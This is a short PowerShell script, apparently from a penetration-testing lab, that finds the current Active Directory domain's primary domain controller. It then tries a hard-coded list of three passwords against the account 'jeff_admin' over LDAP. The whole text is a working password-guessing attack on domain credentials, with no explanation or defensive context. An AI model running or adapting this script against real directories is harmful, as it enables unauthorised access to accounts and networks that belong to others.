$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
  
$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName


$pass_arr = "123456","Qwerty09!","aaaabbbb"


Foreach($pass in $pass_arr)
{
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", $pass)
}
